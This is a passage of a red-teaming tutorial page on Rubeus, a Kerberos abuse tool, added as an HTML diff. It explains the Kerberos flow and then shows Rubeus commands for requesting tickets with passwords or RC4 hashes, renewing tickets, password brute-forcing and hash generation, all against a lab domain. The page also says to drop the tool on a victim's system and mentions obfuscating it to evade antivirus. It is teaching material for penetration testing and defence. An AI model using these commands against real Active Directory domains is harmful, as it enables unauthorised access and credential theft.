@@ -1,0 +1,388 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
+            <h1 class="post-title entry-title">A Detailed Guide on Rubeus</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/a-detailed-guide-on-rubeus/" rel="bookmark"><time class="entry-date published" datetime="2022-05-11T18:26:52+00:00">May 11, 2022</time><time class="updated" datetime="2025-05-14T18:45:48+00:00">May 14, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p>Rubeus<span style="color: #000000;"> is a <strong data-start="355" data-end="369">C# toolkit</strong> for <strong data-start="374" data-end="398">Kerberos interaction</strong> and <strong data-start="403" data-end="412">abuse</strong>. <strong data-start="414" data-end="426">Kerberos</strong>, as we all know, is a <strong data-start="449" data-end="497">ticket-based network authentication protocol</strong> used in <strong data-start="506" data-end="528">Active Directories</strong>. Unfortunately, human error often causes administrators to misconfigure AD without considering security. Therefore, <strong data-start="645" data-end="655">Rubeus</strong> exploits these <strong data-start="671" data-end="692">misconfigurations</strong> and performs functions like crafting keys and granting access using forged certificates. This article explains how to use Rubeus in various scenarios.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Kerberos Authentication Flow</strong></span>
+<ul>
+<li><span style="color: #000000;">Kerberos &amp; its Major Components</span></li>
+<li><span style="color: #000000;">Kerberos Workflow using Messages</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Service Principal Name SPN</strong></span></li>
+<li><span style="color: #000000;"><strong>Rubeus Setup</strong></span></li>
+<li><span style="color: #000000;"><strong>Ticket Operations</strong></span>
+<ul>
+<li><span style="color: #000000;">Asktgt</span></li>
+<li><span style="color: #000000;">Asktgs</span></li>
+<li><span style="color: #000000;">Klist</span></li>
+<li><span style="color: #000000;">Renew</span></li>
+<li><span style="color: #000000;">Brute</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Hash</strong></span></li>
+<li><span style="color: #000000;"><strong>S4u</strong></span></li>
+<li><span style="color: #000000;"><strong>Golden Ticket</strong></span></li>
+<li><span style="color: #000000;"><strong>Silver Ticket</strong></span></li>
+<li><span style="color: #000000;"><strong>Ticket Management</strong></span>
+<ul>
+<li><span style="color: #000000;">Ptt</span></li>
+<li><span style="color: #000000;">Purge</span></li>
+<li><span style="color: #000000;">Describe</span></li>
+<li><span style="color: #000000;">Triage</span></li>
+<li><span style="color: #000000;">Dump</span></li>
+<li><span style="color: #000000;">Tgtdeleg</span></li>
+<li><span style="color: #000000;">Monitor</span></li>
+<li><span style="color: #000000;">Harvest</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Kerberoasting</strong></span></li>
+<li><span style="color: #000000;"><strong>ASREPRoast</strong></span></li>
+<li><span style="color: #000000;"><strong>Createnetonly</strong></span></li>
+<li><span style="color: #000000;"><strong>Changepw</strong></span></li>
+<li><span style="color: #000000;"><strong>Currentluid</strong></span></li>
+<li><span style="color: #000000;"><strong>Conclusion</strong></span></li>
+</ul>
+<h3><span style="color: #800000;">Kerberos Authentication Flow</span></h3>
+<h4><span style="color: #000000;">Kerberos and its Major Components</span></h4>
+<p><span style="color: #000000;">The <strong data-start="854" data-end="875">Kerberos protocol</strong> defines how <strong data-start="888" data-end="899">clients</strong> interact with a <strong data-start="916" data-end="950">network authentication service</strong>. Clients obtain <strong data-start="967" data-end="978">tickets</strong> from the <strong data-start="988" data-end="1021">Key Distribution Center (KDC)</strong> and submit them to application servers when they establish connections. Moreover, the protocol uses <strong data-start="1122" data-end="1137">UDP port 88</strong> by default and relies on <strong data-start="1163" data-end="1193">symmetric key cryptography</strong>.</span></p>
+<p><span style="color: #000000;"><strong><em>“Kerberos uses tickets to authenticate a user and completely avoids sending passwords across the network”.</em></strong></span></p>
+<p><span style="color: #000000;">There are some key components in Kerberos authentication that play a crucial role in the entire authentication process.</span></p>
+<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKAqmRTQMKuCs8Eqh9ML4nUhkH6ir9jf8gePyB5XiKhJOD5Cwe8R3cm9y328d8V_-VqcTTrv61eGnx8I0vpOYBB9qxyF5jRXzNAAqySlsQaGKgxNKdKtNFD88u6jtlAcRsWHx6k6jBvhLk4VphYG-w8RTbLaCwgRfZZnAVGWL_PNdOJyXk94QtW2KeTw/s16000/0.png" alt="Rubeus Guide" width="690" height="523"/></span></p>
+<h4><span style="color: #000000;">Kerberos Workflow using Messages</span></h4>
+<p><span style="color: #000000;">In the Active Directory domain, every domain controller runs a KDC (Kerberos Distribution Center) service that processes all requests for tickets to Kerberos. For Kerberos tickets, AD uses the KRBTGT account in the AD domain.</span></p>
+<p><span style="color: #000000;">The image below shows that the major role played by KDC in establishing a secure connection between the server &amp; client and the entire process uses some special components as defined in the table above.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgc0ZZ7E3Ntv0JTnugNHDv7kilsM8zOJz6UgeE2M7sTjgc8xcpRu-dhf3g18ah0y0ISU7mGzWqKcEIE41Z5vDDrolMVSoRr4rnILY3QIrzvsXLkneEqJFQgaDPbQqj5hEhHlW5XJiUwCNGg7SzQJPKVb34Iklsse5ifZ_aPkIIzdbMJNZZmp1M1P9Sf7Q/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">As mentioned above, Kerberos uses symmetric cryptography for encryption and decryption. Let us get into more details and try to understand how encrypted messages are sent to each other. Here we use three colours to distinguish Hashes:</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>BLUE _KEY</strong>: User NTLM HASH</span></li>
+<li><span style="color: #000000;"><strong>YELLOW_KEY</strong>: Krbtgt NTLM HASH</span></li>
+<li><span style="color: #000000;"><strong>RED_KEY</strong><strong>:</strong> Service NTLM HASH</span></li>
+</ul>
+<h5><strong><span style="color: #000000;">STEPS:</span></strong></h5>
+<p><span style="color: #000000;"><strong>1:</strong> By sending the request message to KDC, client initializes communication as:</span></p>
+<h5><strong><span style="color: #000000;"><em>KRB_AS_REQ contains the following:</em></span></strong></h5>
+<ul>
+<li><span style="color: #000000;"><em>Username of the client to be authenticated.</em></span></li>
+<li><span style="color: #000000;"><em>The service <strong>SPN (SERVICE PRINCIPAL NAME)</strong> linked with Krbtgt account</em></span></li>
+<li><span style="color: #000000;"><em>An encrypted timestamp (Locked with User Hash: Blue Key)</em></span></li>
+</ul>
+<p><span style="color: #000000;">The system encrypts the entire message using the <strong data-start="1250" data-end="1268">User NTLM hash</strong> (Locked with <strong data-start="1282" data-end="1294">BLUE KEY</strong>) to authenticate the <strong data-start="1316" data-end="1324">user</strong> and prevent <strong data-start="1337" data-end="1355">replay attacks</strong>.</span></p>
+<p><span style="color: #000000;"><strong>2:</strong> The KDC uses a database consisting of Users/Krbtgt/Services hashes to decrypt a message (<strong>Unlock with BLUE KEY</strong>) that authenticates user identification.</span></p>
+<p><span style="color: #000000;">Then, the <strong data-start="1373" data-end="1380">KDC</strong> generates a <strong data-start="1393" data-end="1425">TGT (Ticket Granting Ticket)</strong> for the client, encrypts it using the <strong data-start="1464" data-end="1479">Krbtgt hash</strong> (Locked with <strong data-start="1493" data-end="1507">YELLOW KEY</strong>), and includes some encrypted message using the <strong data-start="1556" data-end="1569">user hash</strong>.</span></p>
+<h5><span style="color: #000000;"><strong><em>KRB_AS_REP contains the following:</em></strong></span></h5>
+<ul>
+<li><span style="color: #000000;"><strong><em>Username</em></strong></span></li>
+<li><span style="color: #000000;"><em>Some encrypted data, (Locked with User Hash: Blue Key) that contains:</em></span></li>
+</ul>
+<ul>
+<li><span style="color: #000000;"><em>Session key</em></span></li>
+<li><span style="color: #000000;"><em>The expiration date of TGT</em></span></li>
+</ul>
+<ul>
+<li><span style="color: #000000;"><strong><em>TGT</em></strong><em>, (Locked with Krbtgt Hash: Yellow Key) which contains:</em></span></li>
+</ul>
+<ul>
+<li><span style="color: #000000;"><em>Username</em></span></li>
+<li><span style="color: #000000;"><em>Session key</em></span></li>
+<li><span style="color: #000000;"><em>The expiration date of TGT</em></span></li>
+<li><span style="color: #000000;"><em>PAC with user privileges, signed by KDC</em></span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8cs4DxTHhCqS9yUAa3yOwC8e3ElB50XZ4QyOkWXIEAGssMdjBPNsGVaDz274Z8voKtHNoBHD9qD6PKPvp9KLzdxjUzRtSc_UQ7Jz03v5BHEwhP7wm09K-81SGcv3qTyJ1UDyctCHyDc_PgLZbe4A5GipaqZmDU649RWcNbQtIpM6o6DvKicqXTU5vQA/s16000/2.png"/></span></p>
+<p><span style="color: #000000;"><strong>3:</strong> The client stores the <strong data-start="1599" data-end="1610">KRB_TGT</strong> in the <strong data-start="1618" data-end="1635">Kerberos tray</strong> (memory) of the machine. As a result, since the user already holds the <strong data-start="1707" data-end="1718">KRB_TGT</strong>, the client uses it to identify itself for the <strong data-start="1766" data-end="1781">TGS request</strong> and sends a copy of the TGT with encrypted data to the <strong data-start="1837" data-end="1844">KDC</strong>.</span></p>
+<h5><span style="color: #000000;"><strong><em>KRB_TGS_REQ </em></strong><em>contains:</em></span></h5>
+<ul>
+<li><span style="color: #000000;"><em>Encrypted data with the session key</em></span></li>
+</ul>
+<ul>
+<li><span style="color: #000000;"><em>Username</em></span></li>
+<li><span style="color: #000000;"><em>Timestamp</em></span></li>
+</ul>
+<ul>
+<li><span style="color: #000000;"><em>TGT</em></span></li>
+<li><span style="color: #000000;"><em>SPN of requested service e.g. SQL service</em></span></li>
+</ul>
+<p><span style="color: #000000;"><strong>4:</strong> The <strong data-start="1856" data-end="1863">KDC</strong> receives the <strong data-start="1877" data-end="1892">KRB_TGS_REQ</strong> message and decrypts it using the <strong data-start="1927" data-end="1942">Krbtgt hash</strong> to verify the <strong data-start="1957" data-end="1964">TGT</strong> (Unlocked with <strong data-start="1980" data-end="1994">YELLOW KEY</strong>). Subsequently, it returns a <strong data-start="2024" data-end="2031">TGS</strong> as <strong data-start="2035" data-end="2050">KRB_TGS_REP</strong>, encrypted using the <strong data-start="2072" data-end="2098">requested service hash</strong> (Locked with <strong data-start="2112" data-end="2123">RED KEY</strong>) and an encrypted message using the <strong data-start="2160" data-end="2173">user hash</strong>.</span></p>
+<h5><span style="color: #000000;"><strong><em>KRB_TGS_REP contains:</em></strong></span></h5>
+<ul>
+<li><span style="color: #000000;"><em>Username</em></span></li>
+<li><span style="color: #000000;"><em>Encrypted data with the session key:</em></span></li>
+</ul>
+<ul>
+<li><span style="color: #000000;"><em>Service session key</em></span></li>
+</ul>
+<ul>
+<li><span style="color: #000000;"><em>The expiration date of TGS</em></span></li>
+<li><span style="color: #000000;"><strong><em>TGS</em></strong><em>, (Service Hash: RED Key) which contains:</em></span></li>
+</ul>
+<ul>
+<li><span style="color: #000000;"><em>Service session key</em></span></li>
+<li><span style="color: #000000;"><em>Username</em></span></li>
+<li><span style="color: #000000;"><em>The expiration date of TGS</em></span></li>
+<li><span style="color: #000000;"><em>PAC with user privileges, signed by KDC</em></span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEljfKE_fFEoR8kThrILtnjmFwQPfM61p-SZh6Xg64sLUv7GzLgsvk6Ni5YhC8A7ILETnBFHbsa2ldkL6u1mrWGkDStzkFSP9oCeg3cO_9QxjyltM0ZpKm5Jf2oV8lo-IsfR2C7-jAAaRyWTu_Sofn4TV7BhIl0fj5fYPIicSjbScOtyUql25EmTo-Tw/s16000/3.png" alt="Rubeus Guide" width="726" height="472"/></span></p>
+<p><span style="color: #000000;"><strong>5:</strong> The user sent the copy of TGS to the Application Server,</span></p>
+<h5><span style="color: #000000;"><strong><em>KRB_AP_REQ contains:</em></strong></span></h5>
+<ul>
+<li><span style="color: #000000;"><em>TGS</em></span></li>
+<li><span style="color: #000000;"><em>Encrypted data with the service session key:</em></span></li>
+</ul>
+<ul>
+<li><span style="color: #000000;"><em>Username</em></span></li>
+<li><span style="color: #000000;"><em>Timestamp, to avoid replay attacks</em></span></li>
+</ul>
+<p><span style="color: #000000;"><strong>6:</strong> The application attempts to decrypt the message using its NTLM hash and to verify the PAC from KDC to identify user Privilege which is an optional case.</span></p>
+<p><span style="color: #000000;"><strong>7:</strong>  KDC verifies PAC (Optional)</span></p>
+<p><span style="color: #000000;"><strong>8:</strong>  Allow the user to access the service for a specific time.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjRHXkmSPIEHuM9dyJhlgCc66g2Wvae-afz5tM2Ui8GeJ_5pV0jigtJzOklbyzaPSRLqzVngR9tT1wBa7ie5RZNfkwdLL7wzKDVtcNrl59SV_3C5qPe4owTSFyBg3-jR72lv9kk96DuEnODa3gRgM-AKL9SoCtc_sqVlwKwFyrikvGhZ_WCqRFRmJ8sIQ/s16000/4.png"/></span></p>
+<h3><span style="color: #800000;">Service Principal Name</span></h3>
+<p><span style="color: #000000;">The Service Principal Name (SPN) is a unique identifier for a service instance. Active Directory Domain Services and Windows provide support for Service Principal Names (SPNs), which are key components of the Kerberos mechanism through which a client authenticates a service.</span></p>
+<p><span style="color: #000000;"><strong>Important Points</strong></span></p>
+<ul>
+<li><span style="color: #000000;">If you install multiple instances of a service on computers throughout a forest, each instance must have its own SPN. </span></li>
+<li><span style="color: #000000;">Before the Kerberos authentication service can use an SPN to authenticate a service, an administrator must register the SPN on the account.</span></li>
+<li><span style="color: #000000;">An administrator can register a given SPN on only one account. </span></li>
+<li><span style="color: #000000;">An SPN must remain unique in the forest in which the administrator registers it.</span></li>
+<li><span style="color: #000000;">If it is not unique, authentication will fail.</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>The SPN syntax has four elements </strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5w4iPbIsIxS5VNUzD13_nOXg-0AbmhtwdJWBUqi4keSFbajcnh5Bgqro7FOj686VwDTBbtu0oYjZbBGRyRWxUHy8EAJp8jmUQpDBymwTWzE_9RIpwOkK2Ul6bxIbDZSwHYhknzECBwjBEd4VU5HyMeCciosGRPfcjbaN62fLe6WPiArdLqlHrpGMKOQ/s16000/5.png" alt="Rubeus Guide" width="682" height="197"/></span></p>
+<p><span style="color: #000000;"><strong>Type of SPN:</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Host-based SPNs, associated with the computer account in AD, generate a randomly created 128-character long password that changes every 30 days; hence, they are of no use in Kerberoasting attacks.</span></li>
+<li><span style="color: #000000;">SPNs associate with a domain user account where the NTLM hash will be used.</span></li>
+</ul>
+<h3><span style="color: #800000;">Rubeus setup</span></h3>
+<p><span style="color: #000000;">Interestingly, <strong data-start="2196" data-end="2215">Greek mythology</strong> mentions a three-headed dog named <strong data-start="2250" data-end="2262">Cerberus</strong>, which sounds like <strong data-start="2282" data-end="2294">Kerberos</strong>. Additionally, <strong data-start="2310" data-end="2326">Harry Potter</strong> features a similar three-headed dog called “Fluffy,” owned by <strong data-start="2389" data-end="2406">Rubeus Hagrid</strong>. Inspired by sci-fi and mythology, Will Schroeder and others created Rubeus, a tool that attacks Kerberos and generates raw Kerberos data over UDP port 88. Derived from <strong data-start="2650" data-end="2662">Mimikatz</strong> and <strong data-start="2667" data-end="2692">MakeMeEnterpriseAdmin</strong>, it can generate <strong data-start="2710" data-end="2731">raw Kerberos data</strong> on <strong data-start="2735" data-end="2750">UDP port 88</strong> and is available for download. download <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/GhostPack/Rubeus">here</a></strong></span>.</span></p>
+<p><span style="color: #000000;">Please note that the most recent Rubeus binary is compiled from code by using Visual Studio. but a release for ease of use can also be found <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">here</a></strong></span>.</span></p>
+<p><span style="color: #000000;"><strong>Detection: </strong>Due to its use of generic functions and code from <strong data-start="2851" data-end="2863">Mimikatz</strong> (part of the <strong data-start="2877" data-end="2901">kekeo malware family</strong>), many <strong data-start="2909" data-end="2925">anti-viruses</strong> block <strong data-start="2932" data-end="2942">Rubeus</strong> by default. Furthermore, since Rubeus operates as a <strong data-start="2995" data-end="3017">dropped executable</strong>, attackers often <strong data-start="3035" data-end="3051">obfuscate it</strong> to evade detection when it lands on disk.</span></p>
+<p><span style="color: #000000;">Once downloaded, drop it on the victim’s system and run</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTVpFoBLj7Ukc0w8gy5-l8CHAkwMOcyG1pKNoxygVQ9nN7JK-0PIX3Sx-xciBUjtQuRH-HNIYLWyQiXwBseD2ow1ZLrX2gZHeIWArw_pDZ73_2-OjMkHmQyuZwrj_EyOrKnoaaI1FUPwqpIh2tFCumCwbS9x1uZMxb7cXdgvoUFBcE7E_SbyWFtl8IOA/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">Now that we have set it up, we are ready to demonstrate various options in Rubeus.</span></p>
+<h3><span style="color: #800000;">Ticket Operations</span></h3>
+<p><span style="color: #000000;">Working in an <strong data-start="3114" data-end="3134">Active Directory</strong> environment relies on various <strong data-start="3165" data-end="3176">tickets</strong>. For example, a <strong data-start="3193" data-end="3225">Ticket Granting Ticket (TGT)</strong> is an authentication token the <strong data-start="3257" data-end="3264">KDC</strong> issues to request specific <strong data-start="3292" data-end="3311">resource access</strong> from the <strong data-start="3321" data-end="3328">TGS</strong>.</span></p>
+<p><span style="color: #000000;">In this section, we’ll explore how <strong data-start="3371" data-end="3381">Rubeus</strong> interacts with <strong data-start="3397" data-end="3417">Kerberos tickets</strong> and uses them to gain unauthorized <strong data-start="3453" data-end="3463">access</strong>.</span></p>
+<h4><span style="color: #000000;"><strong> </strong></span><span style="color: #000000;">Asktgt</span></h4>
+<p><span style="color: #000000;"><strong data-start="3471" data-end="3481">Rubeus</strong> can generate <strong data-start="3495" data-end="3517">raw AS-REQ traffic</strong> to request a <strong data-start="3531" data-end="3538">TGT</strong> using a given <strong data-start="3553" data-end="3565">username</strong> and <strong data-start="3570" data-end="3582">password</strong>. Additionally, it accepts encrypted passwords (RC4, AES, or DES). Here’s an example using a clear-text password.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe asktgt /user:harshitrajpal /password:Password@1</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoZ7cs-QGTlKd5Bzpz77QkG6O6Fi72ldE6ow6UL-XPUd9C67hSeOJi9oqI3KMjzHTeXnrzsh4gfW3_YzzHX-Vo79aphiKA-HUtp49i8dnjHouPnzQQ1Jiwjr9VToCj5KtwWhqgKICUBgw2CTYT47tQELkP85ZBab2vugzQn6WmCr5hj5uZMJ-dITJOhg/s16000/7.png" alt="Rubeus Guide" width="704" height="767"/></span></p>
+<p><span style="color: #000000;">As you can see above, someone has successfully generated a KRBTGT that can be further used to generate TGS. You can achieve the same by providing an encrypted password. Let’s use a password encrypted with the RC4 cipher.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe asktgt /user:harshitrajpal /rc4:64FBAE31CC352FC26AF97CBDEF151E03</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6vfMUCFomJiyWrerwcZuM3nwQpfznhLsINzT8AiGJoXTgS0g42p3tERFo0ub34PI3SLF_XLstk_lq9rrbJE4Vjq6Wfvdho0Ntfs870KbT5wB9Mxk-vHTcAht8sC4fkWmU5YV_0BkOm5ILs9gJ8Nq6euvG-wncjJMfoaTn1fc5MpmzXNXSTjmm2JPc4g/s16000/8.png"/></strong></span></p>
+<h4><span style="color: #000000;">Asktgs</span></h4>
+<p><span style="color: #000000;">Rubeus has an asktgs option which can build raw TGS-REP requests by providing a ticket either in the CLI argument or by providing a path to a ticket.kirbi file placed on disk. Each TGS has a specified purpose.</span></p>
+<p><span style="color: #000000;">For example, let’s create a TGS for the LDAP service. One or more service SPNs can be provided.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe asktgs /user:harshitrajpal /ticket:doIFNDCCBTCgAwIBB...bA== /service:LDAP/dc1.ignite.local</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMI6bD_rWmk3OnNX-A2fyRHpOAOuMB9C_79YtSoJITgwK-vMjtkrKnt8HmLMzt6zM0amwmzw8khiMatpV1CW9XCCRjp-1qhcbIWxz3yDZFfNs04v3DGllEd0ZROjkRqwd1ghVF3WbPCfx6HReUAb67OMvMV7IKrIl4zIa5oEwoIwTjRHSO5EJcNCqPIg/s16000/9.png" alt="Rubeus Guide" width="827" height="306"/></span></p>
+<p><span style="color: #000000;">By providing in the TGT we generated in the previous step (copying in notepad and removing enters to type the ticket in a single line) we have generated a TGS successfully.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZIVjHBOo3oUV7kNLe-E4sPeFKTAwW2e0nUV2BxXFxZ2R_Bni2LUjvkiKIL6o0Ugfs_S5N2Q8f383lwlGR0ZYYEcY0VNeha3W0UHtCM8-LaYDxBDWL8GUww5gK3Bb29OUr5U5FB2trJ4h7A3hJEP6BGlNBjcmbBBnaQ2pGfA1Yq7d0REz4DLydwjMjcw/s16000/10.png"/></span></p>
+<h4><span style="color: #000000;">Klist</span></h4>
+<p><span style="color: #000000;">You can use the <strong data-start="3718" data-end="3727">klist</strong> command in <strong data-start="3739" data-end="3750">Windows</strong> to view <strong data-start="3759" data-end="3779">Kerberos tickets</strong> on the system. In this example, running <code data-start="3820" data-end="3827">klist</code> shows that <strong data-start="3839" data-end="3849">KRBTGT</strong> and <strong data-start="3854" data-end="3866">LDAP TGS</strong> tickets have been generated and saved in the current <strong data-start="3920" data-end="3931">session</strong>.</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXmMQ3Twpy5cfkNrwiuysEB9XtIXh5Onuq41Bmss3tO8zzDskS2mgte_KiIvRlPd_RyXr0MAFRP1tuBCkp4nZsAnXwW_gvyP0Fc0LsftC28dDE-V4DQIGExLvnrGD37LUhlyzROJIrdVf4hBDa0HNFhlZzjLIzQfedFGmAA3UzYsbDNPP-7dSmT2mL3w/s16000/11.png" alt="Rubeus Guide" width="816" height="492"/></span></p>
+<h4><span style="color: #000000;">Renew</span></h4>
+<p><span style="color: #000000;">The <strong data-start="3943" data-end="3961">renew function</strong> in <strong data-start="3965" data-end="3975">Rubeus</strong> builds a <strong data-start="3985" data-end="4009">TGT renewal exchange</strong>. You can specify a <strong data-start="4029" data-end="4050">domain controller</strong> using the <code data-start="4061" data-end="4066">/dc</code> flag to direct renewal traffic. Moreover, the <strong data-start="4113" data-end="4125">tgtdeleg</strong> option allows credential extraction without elevation and keeps it valid for a week on another system.</span></p>
+<p><span style="color: #000000;">/ptt flag is in conjunction to apply the Kerberos</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe renew /dc:dc1.ignite.local /ticket:doIFNDCCB....bA==</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0GpSeTg61s0HWOXUHdRK5JkiFgSUmbHE6Hu8QPFINoVu4eEqrhwjcHgkE1N0vy8W_JenfEymZ7Wuzom7DSJ6SB_4A-t6xhhM3YXnM8gN0gu8AVq1yI0boCr_kPi_igdmkLF6SXz_42IPOR0qLwkAk6TffeJVnoZkAvNtc6zcQaccR5YRLVheZyn2dfQ/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">/autorenew sub function will put the exchange to sleep for endTime 30 minutes and after that window automatically renew the TGT and display the renewed ticket</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe renew /dc:dc1.ignite.local /autorenew /ticket:doIFNDCCBTCgAw...bA==</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirxuh_4JAood6FK5wMIFjbbs0mBlJXHHg46gL0FKhJWDkjDN3w9wfsBIexmRzJAtlxXozcTEeCVpU6C46ls0Pfp71GSt6jQTo9ma5H7Vph83B8TsK9lpiHim6VtnmtHOxxdXiLt1dEorn2IWthB-ugOAgUBNXAmseTdzwrlN7MjsNfuW6mQAsP8Y3FJw/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">As you may now observe that after a specified time interval a renewed TGT is shown</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9bgCsSYADAltUs7Q3vRTfTZDSOf9wRunhlIc3WNMZQChVO_iVgdHe8bCNACLVVLt4o4Ewk9U78KMJ3wiuwYiQGmsuWgp0W6T3wLYBVOKmBS7VZjRBPxEZJs_Tx-slKrZI9fPJxIKrhQXu7tbQR3966yrXxlLgVFsOFzb-zOtRAhv2U4Wb1xoa9HuNxQ/s16000/15.png" alt="Rubeus Guide" width="535" height="298"/></span></p>
+<h4><span style="color: #000000;">Brute</span></h4>
+<p><span style="color: #000000;">You can use the <strong data-start="4251" data-end="4267">brute option</strong> in <strong data-start="4271" data-end="4281">Rubeus</strong> to perform a <strong data-start="4295" data-end="4325">password bruteforce attack</strong> against <strong data-start="4334" data-end="4363">Active Directory accounts</strong>. Often, the same password is reused across multiple accounts in real-world enterprise networks. Thus, this function can generate multiple <strong data-start="4502" data-end="4510">TGTs</strong> for accounts using the same password. Use <code data-start="4553" data-end="4564">/noticket</code> alongside this to run without requiring an existing ticket.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe brute /password:Password@1 /noticket</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8INMtJE1du0EspNXMj77ZWTFOnXpqubTigbJ7OEAxdyYRsYdzmFOJ6-4TC9981a5sSh1gSumtK8toDQRacSx-xpU2atrsKCEmiXTlzVuc-WEDEfA_JGRDYtF14fyCnh9rpUCKBdyVKWzgX7BauXZv9MNt-_w1XmV8xOiuN4ZaLpQmy_5xzuuxZDvivA/s16000/16.png"/><br/>
+</strong></span></p>
+<h3><span style="color: #800000;">Hash</span></h3>
+<p><span style="color: #000000;">Rubeus is capable of taking in passwords and generating hashes of them. These are of different formats including NTLM (rc4_hmac) hash. To do this, we can use a <strong>hash </strong>function and provide a domain using /domain, an account’s name (can be a machine account too) using the/user flag and the password using /password.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZwNam6iqN9HFpOVruPYUbfV6Fv4Jdy5rhK3M5jh0bC0T8fCyiuaBZGICX4VpQMH8VgHtHC-W_xc75J_k3fc9VlCPhPjJAwrAYd2EjRxisDx0J7AA0RVzq8v1QSHG9EBQ_vKxFfwqIN8UxppwBCl4X6AlqH31yo_kUhXtwIoC6FMMXQjdIxkj4RM_RXA/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">As you can see 4 different hashes have been output. Various encryption ciphers are used in conjunction with popular hashing techniques. All of these ciphers are supported in AD environment and hence, may be used for different purposes.</span></p>
+<h3><span style="color: #800000;">S4u</span></h3>
